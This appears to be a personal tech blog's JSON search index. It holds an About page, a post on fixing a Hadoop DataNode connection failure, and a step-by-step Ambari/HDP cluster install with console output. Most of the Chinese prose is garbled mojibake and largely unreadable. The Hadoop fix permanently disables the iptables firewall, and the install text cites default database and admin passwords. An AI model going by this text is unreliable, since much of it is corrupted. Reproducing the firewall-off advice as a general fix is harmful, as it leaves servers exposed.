{"pages":[{"title":"","text":"","link":"/404.html"},{"title":"About","text":"work experience:ï¼š1232018-7 - ~~~~~~ ä¸Šå¸‚å…¬å¸-æ‹›å•†é‡‘èæœŸè´·2017-5 - 2018-7 Cè½®ç‹¬è§’å…½åˆ›ä¸šå…¬å¸- Jollychic2015.3 - 2017.4 ä¸Šå¸‚å…¬å¸-é«˜å‡æ§è‚¡-MMtrixæ€§èƒ½é­”æ–¹ My dearest reader Welcome to my blog. I doubt you got to it by accident. With any luck, you got to it because of a search result. If so, I really hope I managed to answer any questions you may have had. With any luck on your part and skill on mine, you not only had your question answered, but had questions you didnâ€™t know you had get answered as well! Not only that, but you stuck around long enough to visit this page and read about me. Thanks! My name is, as the site title says, chengyangyang. I went to school for computers and ended up learning about business instead. Sure enough, I thought I knew what I needed to run a successful business.I may have done alright, but itâ€™s not for me. I need to be in front of a terminal emulator, not in front of a room full of people. Thatâ€™s why I am where I am now. Iâ€™m a Linux server administrator. Iâ€™m passionate about the work I do and strive to learn more every day. From time to time I will run into weird and peculiar issues that take a lot of effort to solve. Sometimes I get questions that I have answered many times before. My blog is my repository for solutions and answers. My goal is to Keep IT DRY. Please check out that page for a complete description of what I mean. If you have something that I should add, let me know. Iâ€™m easy to find and always looking for new useful content! Hereâ€™s my contact: ğŸ“¬ yangcvo[at]gmail.com ğŸ§ QQ:1165958741 ä¸ªäººå·¥ä½œæ‹…ä»»ï¼š15å¹´å‚ä¸CDNè‡ªåŠ¨åŒ–è¿ç»´,ç³»ç»Ÿè¿ç»´ç›¸å…³å·¥ä½œã€‚17å¹´æ‹…ä»»è¿ç»´ç –å®¶ğŸ˜Š åœ¨ä¸€å®¶è·¨å¢ƒç”µå•†è´Ÿè´£è¿ç»´,å…¼ç ”ç©¶SREå¤§æ•°æ®è¿ç»´å¤„ç†BIå·¥ä½œï¼Œ18å¹´åœ¨ä¸€å®¶ä¸Šå¸‚é‡‘èå…¬å¸æ‹…ä»»è¿ç»´ç»ç†â€¦.. ä¸ªäººç®€å†ï¼šgurudigger æ¬¢è¿åŠ æˆ‘QQå’ŒåŠ å…¥æŠ€æœ¯è®¨è®ºç¾¤ï¼šğŸ§ ğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨äº¤æµå¾®ä¿¡ç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥ç¾¤æœ‰é“¾æ¥ã€‚ 14å¹´å¼€å§‹ç”¨çš„ç™¾å®¶ğŸ“– iteyeåšå®¢ï¼šhttp://yango.iteye.com -è¿˜æœ‰51CTOä¸Šé¢ä¹Ÿæœ‰ä¸ªäººæŠ€æœ¯blog ç°åœ¨ç»Ÿä¸€å·²ä¸æ›´æ–°äº†ã€‚ äº’ç›¸å­¦ä¹ ä¸äº¤æµåŠ æˆ‘QQæˆ–è€…å‘mailç»™æˆ‘ã€‚ğŸ˜Š","link":"/ABOUT/About.html"},{"title":"Archives","text":"","link":"/ARCHIVES/archives.html"},{"title":"Tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"Bigdata-hadoopæ–°å¢èŠ‚ç‚¹é›†ç¾¤å¯åŠ¨è¯·æ±‚å¼‚å¸¸ï¼šLast contactï¼š200","text":"å‰è¨€é—²è°ˆï¼šä¹‹å‰åšCDNäº‘è®¡ç®—å…¬å¸æ¥åˆ°ç¾å¹´å¤§å¥åº·ç°åœ¨åœ¨ä¸€å®¶åŒ»ç–—å¤§æ•°æ®å…¬å¸è´Ÿè´£è¿ç»´éƒ¨é—¨å¤§å¤§å°å°çš„æ´»ï¼Œæ—¢ç„¶æ˜¯åŒ»ç–—å¤§æ•°æ®å½“ç„¶ç¦»ä¸å¼€å¤§æ•°æ®å­˜å‚¨çš„ç»´æŠ¤ï¼Œç°åœ¨ä¹ŸåŒæ—¶ç»´æŠ¤å¤§æ•°æ®è¿ç»´ç›¸å…³å·¥ä½œ hadoop,spark,sqoop,hue,hive,Hbase,zookeeperç­‰ç­‰ æµ‹è¯•å¼€å‘ç”Ÿäº§ä½¿ç”¨èµ·æ¥,ä»é›†ç¾¤ç¯å¢ƒç»´æŠ¤ æå‡æ•°æ®ç¨³å®šæ€§ é«˜å¯ç”¨ç»´æŠ¤ã€‚ å‰é¢è¯´äº†ä¸€å †è‡ªå·±é—²èŠï¼ŒçœŸæ­£è§£å†³è¿™æ¬¡é—®é¢˜æ˜¯hadoopæ–°å¢èŠ‚ç‚¹éœ€è¦æ³¨æ„å“ªå‡ ç‚¹ï¼š æ–°å¢èŠ‚ç‚¹å¦‚ä½•æ–°å¢æˆ‘ä¼šåœ¨å¦å¤–ä¸€ç¯‡è¯¦ç»†è¯´çš„è¿™é‡Œæˆ‘è®²ä¸€äº›éœ€è¦æ³¨æ„æ‰çš„é—®é¢˜ã€‚ éœ€è¦ä¿®æ”¹å‡ ä¸ªé…ç½®ï¼šï¼ˆ1ï¼‰hadoop data æ•°æ®ç›®å½• VERSION é‡Œé¢çš„æ­å»ºé›†ç¾¤æ—¶ï¼Œç›´æ¥å…‹éš†ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ã€‚è§£å†³æ–¹æ³•åŒä¸Šä¸¤ç§ï¼Œæœ€å¥½ä¿®æ”¹${/hadoop/tmp/dir}/dfs/data/current/VERSIONä¸­çš„storageIDï¼Œä½¿å…¶ä¸åŒã€‚ç¬¬ä¸€ç§ä¼šå¯¼è‡´hdfsæ•°æ®ä¸¢å¤±ã€‚ è§£å†³æ–¹æ³•ï¼š 12ï¼ˆ1ï¼‰ datanodeå¯åŠ¨æ˜¯ä¼šåŠ è½½DataStorageï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼šformatï¼ˆ2ï¼‰åˆæ¬¡å¯åŠ¨DataStorageçš„storageIDæ˜¯ç©ºçš„ï¼Œæ‰€ä»¥ä¼šç”Ÿæˆä¸€ä¸ªstorageID å‚è€ƒæˆ‘è§£å†³çš„ï¼šè¿™é‡Œæˆ‘æ‹·è´è¿‡æ¥ ç›´æ¥åˆ é™¤ã€‚ç­‰é›†ç¾¤namenodeå¯åŠ¨ ä¼šè‡ªåŠ¨ç”Ÿæˆã€‚ è¿™ä¸ªè§£å†³ä»¥å æ–°å¢çš„æœºå™¨å¿…é¡»å…³é—­é˜²ç«å¢™ã€‚å› ä¸ºè¿™ä¸ªåŸå› ä¼šå¯¼è‡´æˆ‘ hadoopæ–°å¢èŠ‚ç‚¹é›†ç¾¤å¯åŠ¨è¯·æ±‚å¼‚å¸¸ï¼šLast contactï¼š200 ï¼ˆ2ï¼‰ é›†ç¾¤é‡å¯æ—¶é˜²ç«å¢™è‡ªåŠ¨å¼€å¯å¯¼è‡´ï¼š è¿™é‡Œè´´å¼ å›¾ç‰‡ç»™å¤§å®¶çœ‹çœ‹ï¼š é—®é¢˜ï¼š 1234562017-07-04 18:43:30,475 INFO org.apache.hadoop.ipc.Client: Retrying connect to server: /192.168.18.218:9000. Already tried 8 time(s).2017-07-04 18:43:31,475 INFO org.apache.hadoop.ipc.Client: Retrying connect to server: /192.168.18.218:9000. Already tried 9 time(s).2017-07-04 18:43:31,479 ERROR org.apache.hadoop.hdfs.server.datanode.DataNode: java.io.IOException: Call to /192.168.18.218:9000 failed on local exception: java.net.NoRouteToHostException: æ²¡æœ‰åˆ°ä¸»æœºçš„è·¯ç”± at org.apache.hadoop.ipc.Client.wrapException(Client.java:775) at org.apache.hadoop.ipc.Client.call(Client.java:743)è§£å†³æ–¹æ³•ï¼šåœ¨rootæƒé™ä¸‹å…³é—­é˜²ç«å¢™ï¼šservice iptables stop æœ€å¥½é…ç½®æˆæœºå™¨é‡å¯é»˜è®¤é˜²ç«å¢™å…³é—­ï¼š 12[root@junlings ~]# chkconfig iptables off #å¼€æœºä¸å¯åŠ¨é˜²ç«å¢™æœåŠ¡[root@junlings ~]# chkconfig iptables on #å¼€æœºå¯åŠ¨é˜²ç«å¢™æœåŠ¡ è§£å†³ä»¥åæœåŠ¡é‡æ–°è·‘ä¸€éå·²ç»æå®šã€‚","link":"/2017/05/08/Bigdata-hadoop/ hadoopæ–°å¢èŠ‚ç‚¹é›†ç¾¤å¯åŠ¨è¯·æ±‚å¼‚å¸¸ï¼šLast contactï¼š200/"},{"title":"HORTONW0RKSæ•°æ®å¹³å°å®ç°æ­å»ºAmbarié…ç½®å’Œéƒ¨ç½²HDPé›†ç¾¤ç›‘æ§Hadoopé›†ç¾¤","text":"HORTONW0RKSæ•°æ®å¹³å°æ­å»ºAmbariç®¡ç†ç›‘æ§Hadoopé›†ç¾¤ é¢˜å¤–è¯ æˆ‘ç°åœ¨åœ¨ä¸€å®¶ä¸Šå¸‚å…¬å¸æ——ä¸‹æ§è‚¡å­å…¬å¸è´Ÿè´£è¿ç»´éƒ¨é—¨ï¼Œè´Ÿè´£ITç½‘ç»œå®‰å…¨åŠå…¬ï¼šä¸»è¦åšçš„åº”ç”¨è¿ç»´å’Œç½‘ç»œè¿ç»´ï¼Œå…¼å¤§æ•°æ®è¿ç»´ã€‚æœ€è¿‘è·Ÿæ–°æ¥çš„æ¶æ„å¸ˆèŠäº†ä¸‹Hadoopç›‘æ§æ–¹é¢ï¼šHORTONW0RKSæ•°æ®å¹³å°æ­å»ºAmbariç›‘æ§Hadoopé›†ç¾¤. HORTONW0RKSæ•°æ®å¹³å°ï¼ˆHDP Â®ï¼‰HDPæ˜¯ä¸šå†…å”¯ä¸€çœŸæ­£å®‰å…¨çš„ä¼ä¸šçº§å¼€æºçš„Apacheçš„Hadoopâ„¢ Â®åˆ†é…åŸºäºé›†ä¸­å¼æ¶æ„ã€‚HDPè§£å†³äº†é™æ€æ•°æ®çš„å®Œæ•´éœ€æ±‚ï¼Œä¸ºå®æ—¶å®¢æˆ·åº”ç”¨æä¾›æ”¯æŒï¼Œå¹¶æä¾›å¯åŠ é€Ÿå†³ç­–å’Œåˆ›æ–°çš„å¯é åˆ†æã€‚ ä½¿ç”¨Hortonworks Sandboxè¯•ç”¨æœ€æ–°çš„HDPåŠŸèƒ½ï¼Œæˆ–è€…ä¸ºç”Ÿäº§ç¯å¢ƒè®¾ç½®HDPï¼Œå®‰è£…å’Œé…ç½®ç¾¤é›†ã€‚æŸ¥çœ‹å®˜ç½‘æ–‡æ¡£ï¼šHORTONWORKS CONNECTED DATA PLATFORMS DOWNLOADS 1. å°†AmbariæœåŠ¡å­˜å‚¨åº“æ–‡ä»¶ä¸‹è½½åˆ°å®‰è£…ä¸»æœºä¸Šçš„ç›®å½•ã€‚ Centos6.5 1wget -nv http://public-repo-1.hortonworks.com/ambari/centos6/2.x/updates/2.4.2.0/ambari.repo -O /etc/yum.repos.d/ambari.repo âš ï¸è­¦å‘Šï¼šä¸è¦ä¿®æ”¹ambari.repoæ–‡ä»¶åã€‚åœ¨ä»£ç†æ³¨å†ŒæœŸé—´ï¼Œæ­¤æ–‡ä»¶åº”åœ¨AmbariæœåŠ¡å™¨ä¸»æœºä¸Šå¯ç”¨ã€‚ é€šè¿‡æ£€æŸ¥repoåˆ—è¡¨ç¡®è®¤å­˜å‚¨åº“å·²é…ç½®ã€‚ 1yum repolist æ‚¨åº”è¯¥åœ¨åˆ—è¡¨ä¸­çœ‹åˆ°ç±»ä¼¼äºä»¥ä¸‹Ambariå­˜å‚¨åº“çš„å€¼ã€‚ ç‰ˆæœ¬å€¼å› å®‰è£…è€Œå¼‚ã€‚ å®‰è£…AmbariæœåŠ¡ã€‚è¿™ä¹Ÿå®‰è£…äº†é»˜è®¤çš„PostgreSQL Ambariæ•°æ®åº“ã€‚ 1yum install ambari-server è¾“å…¥yæç¤ºï¼Œä»¥ç¡®è®¤äº¤æ˜“å’Œä¾èµ–æ€§æ£€æŸ¥æ—¶ã€‚ æˆåŠŸå®‰è£…å°†æ˜¾ç¤ºç±»ä¼¼äºä»¥ä¸‹å†…å®¹çš„è¾“å‡ºï¼š 12345678910111213141516å®‰è£…ï¼špostgresql-libs-8.4.20-3.el6_6.x86_64 1/4å®‰è£…ï¼špostgresql-8.4.20-3.el6_6.x86_64 2/4å®‰è£…ï¼špostgresql-server-8.4.20-3.el6_6.x86_64 3/4å®‰è£…ï¼šambari-server-2.4.2.0-1470.x86_64 4/4éªŒè¯ï¼šambari-server-2.4.2.0-1470.x86_64 1/4éªŒè¯ï¼špostgresql-8.4.20-3.el6_6.x86_64 2/4éªŒè¯ï¼špostgresql-server-8.4.20-3.el6_6.x86_64 3/4éªŒè¯ï¼špostgresql-libs-8.4.20-3.el6_6.x86_64 4/4å®‰è£…ï¼š ambari-server.x86_64 0ï¼š2.4.2.0-1470 å®‰è£…è¿™é‡Œçš„æ—¶å€™ä¼šæœ‰ç‚¹æ…¢ï¼Œå› ä¸ºæ˜¯è®¿é—®å›½å¤–ç½‘ç«™ä¸‹è½½èµ„æºã€‚å·²å®‰è£…ä¾èµ–å…³ç³»ï¼š postgresql.x86_64 0ï¼š8.4.20-3.el6_6 postgresql-libs.x86_64 0ï¼š8.4.20-3.el6_6 postgresql-server.x86_64 0ï¼š8.4.20-3.el6_6 â—ï¸â—ï¸ã€æ³¨æ„ã€‘ æ¥å—æœ‰å…³ä¿¡ä»»Hortonworks GPGå¯†é’¥çš„è­¦å‘Šã€‚è¯¥é”®å°†è‡ªåŠ¨ä¸‹è½½å¹¶ç”¨äºéªŒè¯Hortonworksçš„è½¯â€‹â€‹ä»¶åŒ…ã€‚æ‚¨å°†çœ‹åˆ°ä»¥ä¸‹æ¶ˆæ¯ï¼š Importing GPG key 0x07513CAD: Userid: â€œJenkins (HDP Builds) &#x6a;&#x65;&#x6e;&#107;&#105;&#x6e;&#x40;&#x68;&#x6f;&#x72;&#x74;&#111;&#110;&#119;&#111;&#114;&#107;&#115;&#46;&#x63;&#x6f;&#x6d;â€œ From :http://s3.amazonaws.com/dev.hortonworks.com/ambari/centos6/RPM-GPG-KEY/RPM-GPG-KEY-Jenkins â—ï¸â—ï¸ã€æ³¨æ„ã€‘ åœ¨å…·æœ‰æœ‰é™Internetè®¿é—®æˆ–æ²¡æœ‰Internetè®¿é—®çš„ç¾¤é›†ä¸Šéƒ¨ç½²HDPæ—¶ï¼Œåº”ä½¿ç”¨å…¶ä»–æ–¹æ³•æä¾›å¯¹ä½çš„è®¿é—®ã€‚æœ‰å…³è®¾ç½®æœ¬åœ°å­˜å‚¨åº“çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…ä½¿ç”¨æœ¬åœ°å­˜å‚¨åº“ã€‚ AmbariæœåŠ¡å™¨é»˜è®¤ä½¿ç”¨åµŒå…¥å¼PostgreSQLæ•°æ®åº“ã€‚å½“æ‚¨å®‰è£…AmbariæœåŠ¡å™¨æ—¶ï¼ŒPostgreSQLè½¯ä»¶åŒ…å’Œä¾èµ–å…³ç³»å¿…é¡»å¯ç”¨äºå®‰è£…ã€‚è¿™äº›åŒ…é€šå¸¸ä½œä¸ºæ“ä½œç³»ç»Ÿå­˜å‚¨åº“çš„ä¸€éƒ¨åˆ†æä¾›ã€‚è¯·ç¡®è®¤æ‚¨å…·æœ‰é€‚ç”¨äºpostgresql-serverè½¯ä»¶åŒ…çš„ç›¸åº”å­˜å‚¨åº“ã€‚ 2.è®¾ç½®AmbariæœåŠ¡å™¨åœ¨å¯åŠ¨AmbariæœåŠ¡å™¨ä¹‹å‰ï¼Œå¿…é¡»è®¾ç½®AmbariæœåŠ¡å™¨ã€‚å®‰è£…ç¨‹åºå°†Ambarié…ç½®ä¸ºä¸Ambariæ•°æ®åº“é€šä¿¡ï¼Œå®‰è£…JDKå¹¶å…è®¸æ‚¨è‡ªå®šä¹‰Ambari Serverå®ˆæŠ¤ç¨‹åºå°†ä½œä¸ºè¿è¡Œçš„ç”¨æˆ·å¸æˆ·ã€‚è¯¥ ambari-server setupå‘½ä»¤ç®¡ç†è®¾ç½®è¿‡ç¨‹ã€‚åœ¨AmbariæœåŠ¡å™¨ä¸»æœºä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ä»¥å¼€å§‹è®¾ç½®è¿‡ç¨‹ã€‚æ‚¨è¿˜å¯ä»¥å°†â€œ è®¾ç½®é€‰é¡¹â€é™„åŠ åˆ°å‘½ä»¤ã€‚ å¯åŠ¨æœåŠ¡ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162ambari-server setup###è¿™é‡Œç”±äºä¸‹è½½jdk1.8å¤ªæ…¢é€Ÿåº¦è¿‡æ…¢ã€‚æˆ‘æå‰æŠŠjdkä¸‹è½½ä¸‹æ¥æ”¾åˆ°äº†/srv/jdk1.8.0_66 ç›®å½•[root@ambari-server_01 ~]# ambari-server setupUsing python /usr/bin/pythonSetup ambari-serverChecking SELinux...SELinux status is 'enabled'SELinux mode is 'permissive'WARNING: SELinux is set to 'permissive' mode and temporarily disabled.OK to continue [y/n] (y)? yCustomize user account for ambari-server daemon [y/n] (n)? yEnter user account for ambari-server daemon (root):Adjusting ambari-server permissions and ownership...Checking firewall status...Checking JDK...[1] Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8[2] Oracle JDK 1.7 + Java Cryptography Extension (JCE) Policy Files 7[3] Custom JDK==============================================================================Enter choice (1): 3WARNING: JDK must be installed on all hosts and JAVA_HOME must be valid on all hosts.WARNING: JCE Policy files are required for configuring Kerberos security. If you plan to use Kerberos,please make sure JCE Unlimited Strength Jurisdiction Policy Files are valid on all hosts.Path to JAVA_HOME: /srv/jdk1.8.0_66Validating JDK on Ambari Server...done.Completing setup...Configuring database...Enter advanced database configuration [y/n] (n)? yConfiguring database...==============================================================================Choose one of the following options:[1] - PostgreSQL (Embedded)[2] - Oracle[3] - MySQL / MariaDB[4] - PostgreSQL[5] - Microsoft SQL Server (Tech Preview)[6] - SQL Anywhere[7] - BDB==============================================================================Enter choice (1):3Database name (ambari):Postgres schema (ambari):Username (ambari):Enter Database Password (bigdata):Default properties detected. Using built-in database.Configuring ambari database...Checking PostgreSQL...Running initdb: This may take up to a minute.æ­£åœ¨åˆå§‹åŒ–æ•°æ®åº“ï¼š[ç¡®å®š]About to start PostgreSQLConfiguring local database...Connecting to local database...done.Configuring PostgreSQL...Restarting PostgreSQLExtracting system views...ambari-admin-2.4.2.0.136.jar............Adjusting ambari-server permissions and ownership...Ambari Server 'setup' completed successfully.You have mail in /var/spool/mail/root 2.1 å“åº”å®‰è£…æç¤ºï¼šå¦‚æœæ‚¨æ²¡æœ‰æš‚æ—¶ç¦ç”¨SELinuxï¼Œæ‚¨å¯èƒ½ä¼šæ”¶åˆ°è­¦å‘Šã€‚æ¥å—é»˜è®¤å€¼ï¼ˆyï¼‰ï¼Œç„¶åç»§ç»­ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒAmbariæœåŠ¡å™¨è¿è¡Œåœ¨rootã€‚åœ¨Customize user account for ambari-server daemonæç¤ºç¬¦å¤„æ¥å—é»˜è®¤ï¼ˆnï¼‰ï¼Œä»¥ç»§ç»­rootã€‚ å¦‚æœè¦åˆ›å»ºå…¶ä»–ç”¨æˆ·ä»¥è¿è¡ŒAmbariæœåŠ¡å™¨æˆ–åˆ†é…ä»¥å‰åˆ›å»ºçš„ç”¨æˆ·ï¼Œè¯·yåœ¨ Customize user account for ambari-server daemonæç¤ºç¬¦å¤„é€‰æ‹©ï¼Œç„¶åæä¾›ç”¨æˆ·åã€‚æœ‰å…³ä»¥érootç”¨æˆ·èº«ä»½è¿è¡ŒAmbariæœåŠ¡å™¨çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…Hortonworksæ•°æ®å¹³å°Apache Ambariå‚è€ƒ&gt; ä¸ºéæ ¹ç”¨æˆ·é…ç½®Ambari å¦‚æœæ‚¨æ²¡æœ‰æš‚æ—¶åœç”¨iptablesï¼Œå¯èƒ½ä¼šæ”¶åˆ°è­¦å‘Šã€‚è¾“å…¥yä»¥ç»§ç»­ã€‚ JDKé€‰æ‹©è¦ä¸‹è½½çš„JDKç‰ˆæœ¬ã€‚è¾“å…¥1ä»¥ä¸‹è½½Oracle JDK 1.8ã€‚æˆ–è€…ï¼Œæ‚¨å¯ä»¥é€‰æ‹©è¾“å…¥è‡ªå®šä¹‰JDKã€‚å¦‚æœé€‰æ‹©â€œè‡ªå®šä¹‰JDKâ€ï¼Œåˆ™å¿…é¡»åœ¨æ‰€æœ‰ä¸»æœºä¸Šæ‰‹åŠ¨å®‰è£…JDKå¹¶æŒ‡å®šJava Homeè·¯å¾„ã€‚ â—ï¸â—ï¸ã€æ³¨æ„ã€‘ JDKæ”¯æŒå®Œå…¨å–å†³äºæ‚¨é€‰æ‹©çš„HDP Stackç‰ˆæœ¬ã€‚è¯·å‚é˜…Hortonworksæ•°æ®å¹³å°Apache Ambariå‚è€ƒä»¥æŸ¥çœ‹è¦å®‰è£…çš„HDP Stackç‰ˆæœ¬æ”¯æŒçš„JDKç‰ˆæœ¬ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒAmbariæœåŠ¡å™¨è®¾ç½®ä¸‹è½½å¹¶å®‰è£…Oracle JDK 1.8å’Œéšé™„çš„Javaå¯†ç æœ¯æ‰©å±•ï¼ˆJCEï¼‰ç­–ç•¥æ–‡ä»¶ã€‚å¦‚æœè®¡åˆ’ä½¿ç”¨å…¶ä»–ç‰ˆæœ¬çš„JDKï¼Œè¯·å‚é˜… è®¾ç½®é€‰é¡¹ä»¥è·å–æ›´å¤šä¿¡æ¯ã€‚ å‡ºç°æç¤ºæ—¶æ¥å—Oracle JDKè®¸å¯è¯ã€‚æ‚¨å¿…é¡»æ¥å—æ­¤è®¸å¯è¯æ‰èƒ½ä»Oracleä¸‹è½½å¿…éœ€çš„JDKã€‚JDKåœ¨éƒ¨ç½²é˜¶æ®µå®‰è£…ã€‚ æ•°æ®åº“é€‰æ‹©ï¼š é€‰æ‹©nä¸ºï¼ŒEnter advanced database configurationä»¥ä¾¿ä¸ºAmbariä½¿ç”¨é»˜è®¤çš„åµŒå…¥å¼PostgreSQLæ•°æ®åº“ã€‚é»˜è®¤çš„PostgreSQLæ•°æ®åº“åæ˜¯ambariã€‚é»˜è®¤ç”¨æˆ·åå’Œå¯†ç ä¸ºambari/bigdataã€‚å¦åˆ™ï¼Œè¦ä½¿ç”¨ç°æœ‰çš„PostgreSQLï¼ŒMySQL / MariaDBæˆ–Oracleæ•°æ®åº“ä¸Ambariï¼Œè¯·é€‰æ‹©yã€‚ å¦‚æœä½¿ç”¨ç°æœ‰çš„PostgreSQLï¼ŒMySQL / MariaDBæˆ–Oracleæ•°æ®åº“å®ä¾‹ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹æç¤ºä¹‹ä¸€ï¼š â—ï¸â—ï¸[é‡è¦]åœ¨è¿è¡Œå®‰è£…ç¨‹åºå’Œè¾“å…¥é«˜çº§æ•°æ®åº“é…ç½®ä¹‹å‰ï¼Œå¿…é¡»ä½¿ç”¨â€œä½¿ç”¨éé»˜è®¤æ•°æ®åº“- Ambariâ€ä¸­è¯¦è¿°çš„æ­¥éª¤å‡†å¤‡éé»˜è®¤æ•°æ®åº“å®ä¾‹ã€‚ â—ï¸â—ï¸[é‡è¦] ä¸æ”¯æŒä½¿ç”¨Microsoft SQL Serveræˆ–SQL Anywhereæ•°æ®åº“é€‰é¡¹ã€‚ è¦ä½¿ç”¨ç°æœ‰çš„Oracleå®ä¾‹ï¼Œå¹¶ä¸ºè¯¥æ•°æ®åº“é€‰æ‹©è‡ªå·±çš„æ•°æ®åº“åç§°ï¼Œç”¨æˆ·åå’Œå¯†ç ï¼Œè¯·è¾“å…¥2ã€‚é€‰æ‹©è¦ä½¿ç”¨çš„æ•°æ®åº“ï¼Œå¹¶æä¾›åœ¨æç¤ºä¸­è¯·æ±‚çš„ä»»ä½•ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä¸»æœºåï¼Œç«¯å£ï¼ŒæœåŠ¡åæˆ–SIDï¼Œç”¨æˆ·åå’Œå¯†ç ã€‚è¦ä½¿ç”¨ç°æœ‰çš„MySQL / MariaDBæ•°æ®åº“ï¼Œå¹¶ä¸ºè¯¥æ•°æ®åº“é€‰æ‹©è‡ªå·±çš„æ•°æ®åº“åç§°ï¼Œç”¨æˆ·åå’Œå¯†ç ï¼Œè¯·è¾“å…¥3ã€‚é€‰æ‹©è¦ä½¿ç”¨çš„æ•°æ®åº“ï¼Œå¹¶æä¾›åœ¨æç¤ºä¸­è¯·æ±‚çš„ä»»ä½•ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä¸»æœºåï¼Œç«¯å£ï¼Œæ•°æ®åº“åç§°ï¼Œç”¨æˆ·åå’Œå¯†ç ã€‚è¦ä½¿ç”¨ç°æœ‰çš„PostgreSQLæ•°æ®åº“ï¼Œå¹¶ä¸ºè¯¥æ•°æ®åº“é€‰æ‹©è‡ªå·±çš„æ•°æ®åº“åç§°ï¼Œç”¨æˆ·åå’Œå¯†ç ï¼Œè¯·è¾“å…¥4ã€‚é€‰æ‹©è¦ä½¿ç”¨çš„æ•°æ®åº“ï¼Œå¹¶æä¾›åœ¨æç¤ºä¸­è¯·æ±‚çš„ä»»ä½•ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä¸»æœºåï¼Œç«¯å£ï¼Œæ•°æ®åº“åç§°ï¼Œç”¨æˆ·åå’Œå¯†ç ã€‚ç»§ç»­é…ç½®è¿œç¨‹æ•°æ®åº“è¿æ¥å±æ€§[y / n]é€‰æ‹©yã€‚ è¿™é‡Œæ•°æ®åº“ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯é»˜è®¤å®‰è£…ï¼š 1234Database name (ambari)Postgres schema (ambari)Username (ambari)Enter Database Password (bigdata) è¿™é‡Œæˆ‘åšäº†ä¸€å±‚Nginxä»£ç†ï¼šå°†AmbariæœåŠ¡å™¨é…ç½®ä¸ºä½¿ç”¨æ­¤ä»£ç†æœåŠ¡å™¨ 3.å¯åŠ¨AmbariæœåŠ¡å™¨åœ¨AmbariæœåŠ¡å™¨ä¸»æœºä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š ambari-server start 1234567891011121314[root@ambari-server ~]# ambari-server startUsing python /usr/bin/pythonStarting ambari-serverAmbari Server running with administrator privileges.Organizing resource files at /var/lib/ambari-server/resources...Ambari database consistency check started...No errors were found.Ambari database consistency check finishedServer PID at: /var/run/ambari-server/ambari-server.pidServer out at: /var/log/ambari-server/ambari-server.outServer log at: /var/log/ambari-server/ambari-server.logWaiting for server start....................Ambari Server 'start' completed successfully.You have mail in /var/spool/mail/root è¦æ£€æŸ¥AmbariæœåŠ¡å™¨è¿›ç¨‹ï¼š ambari-server status åœæ­¢AmbariæœåŠ¡å™¨ï¼š ambari-server stop åœ¨AmbariæœåŠ¡å™¨å¯åŠ¨æ—¶ï¼ŒAmbariè¿è¡Œæ•°æ®åº“ä¸€è‡´æ€§æ£€æŸ¥ï¼ŒæŸ¥æ‰¾é—®é¢˜ã€‚å¦‚æœå‘ç°ä»»ä½•é—®é¢˜ï¼ŒAmbariæœåŠ¡å™¨å¯åŠ¨å°†ä¸­æ­¢ï¼Œå¹¶ä¸”ä¸€æ¡æ¶ˆæ¯å°†æ‰“å°åˆ°æ§åˆ¶å°â€œæ•°æ®åº“é…ç½®ä¸€è‡´æ€§æ£€æŸ¥å¤±è´¥â€ã€‚æ›´å¤šè¯¦ç»†ä¿¡æ¯å°†å†™å…¥ä»¥ä¸‹æ—¥å¿—æ–‡â€‹â€‹ä»¶ï¼š /var/log/ambari-server/ambari-server-check-database.log æ‚¨å¯ä»¥é€šè¿‡ä½¿ç”¨ä»¥ä¸‹é€‰é¡¹è·³è¿‡æ­¤æ£€æŸ¥æ¥å¼ºåˆ¶AmbariæœåŠ¡å™¨å¯åŠ¨ï¼š ambari-server start --skip-database-check å¦‚æœå­˜åœ¨æ•°æ®åº“é—®é¢˜ï¼Œè¯·é€‰æ‹©è·³è¿‡æ­¤æ£€æŸ¥ï¼Œåœ¨æ›´æ­£æ•°æ®åº“ä¸€è‡´æ€§é—®é¢˜ä¹‹å‰ï¼Œä¸è¦å¯¹é›†ç¾¤æ‹“æ‰‘è¿›è¡Œä»»ä½•æ›´æ”¹æˆ–æ‰§è¡Œé›†ç¾¤å‡çº§ã€‚æœ€å¥½æŸ¥çœ‹å®˜ç½‘æ“ä½œã€‚ ç¬¬3ç« å®‰è£…ï¼Œé…ç½®å’Œéƒ¨ç½²HDPé›†ç¾¤1.ç™»å½•åˆ°Apache Ambari å°†æµè§ˆå™¨æŒ‡å‘ http://&lt;your.ambari.server&gt; :8080ï¼Œå…¶ä¸­&lt;your.ambari.server&gt;æ˜¯æ‚¨çš„ambariæœåŠ¡å™¨ä¸»æœºçš„åç§°ã€‚ä¾‹å¦‚ï¼Œé»˜è®¤AmbariæœåŠ¡å™¨ä¸»æœºä½äºhttp://c6401.ambari.apache.org:8080ã€‚ ä½¿ç”¨é»˜è®¤ç”¨æˆ·å/å¯†ç ç™»å½•AmbariæœåŠ¡å™¨ï¼šadmin / adminã€‚æ‚¨å¯ä»¥ç¨åæ›´æ”¹è¿™äº›å‡­æ®ã€‚ 